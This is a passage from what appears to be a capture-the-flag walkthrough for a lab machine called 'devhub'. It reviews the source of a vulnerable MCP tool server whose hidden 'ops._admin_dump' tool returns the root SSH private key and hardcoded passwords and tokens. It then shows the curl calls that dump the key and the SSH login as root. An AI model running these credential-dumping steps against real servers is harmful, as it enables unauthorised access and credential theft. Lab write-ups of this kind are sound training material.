        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
...[snip]...
```

`/` just gives metadata about the server. `/health` returns a static uptime (very lame). `/tools/list` returns the visible tools (leaving out the hidden tools).

The `call_tool` method checks auth and validates the input, and then is a big `if` / `elif` / `else` block:

```python
@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401

    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})

    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400

    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404

    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })

    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })

    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })

    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })

    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })

    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)

        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })

        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })

        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })

        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })

        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })

    return jsonify({"error": "Tool execution failed"}), 500
```

Most of the tools just return static hardcoded data. `ops._debug_mode` returns the hidden tool list. `ops._admin_dump` reads the `id_rsa` file from root and returns it!

### SSH

#### Enumerate MCP

The root of the MCP lists tools just like expected:

```ruby
analyst@devhub:/$ curl http://127.0.0.1:5000/
{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}
```

`/health` returns the static message:

```ruby
analyst@devhub:/$ curl http://127.0.0.1:5000/health
{"status":"healthy","uptime":"14d 3h 22m"}
```

`/tools/list` asks for auth:

```typescript
analyst@devhub:/$ curl http://127.0.0.1:5000/tools/list
{"error":"Unauthorized","message":"Valid X-API-Key header required"}
```

With the auth header and key it works:

```typescript
analyst@devhub:/$ curl http://127.0.0.1:5000/tools/list -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a'
{"count":4,"details":{"ops.check_disk":{"description":"Check disk usage","parameters":{}},"ops.list_services":{"description":"List running services","parameters":{}},"ops.system_status":{"description":"Get system status and health metrics","parameters":{}},"ops.view_logs":{"description":"View recent system logs","parameters":{"service":"string"}}},"tools":["ops.system_status","ops.list_services","ops.check_disk","ops.view_logs"]}
```

Calling a tool requires a POST request with a body. The `ops.system_status` tool returns a static JSON:

```typescript
analyst@devhub:/$ curl http://127.0.0.1:5000/tools/call -d '{"name": "ops.system_status"}' -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -H 'Content-Type: application/json'
{"cpu":"23%","load":"0.45","memory":"1.2GB/4GB","status":"nominal"}
```

The interesting tool is `ops._admin_dump`. It requires also having an `arguments` parameter with `target` and `confirm` parameters. `target` is `ssh_keys`. `confirm` only has to be truthy, as the code checks `if not confirm`, so the string `"true"` does the job just as well as a JSON `true`. It works:

```swift
analyst@devhub:/$ curl http://127.0.0.1:5000/tools/call -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": "true"}}' -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -H 'Content-Type: application/json'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\n...[snip]...Xhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

#### Connect

I can paste that key into Python to print it in a format I can use:

```swift
oxdf@hacky$ python -c 'print("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\n...[snip]...fS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n")'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
...[snip]...
C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----
```

I’ll save that to a file with 600 permissions so that SSH will accept it, and then connect:

```ruby
oxdf@hacky$ ssh -i ~/keys/devhub-root root@devhub.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
...[snip]...
root@devhub:~#
```

And grab the root flag:

```
root@devhub:~# cat root.txt
f09d81a1************************
```
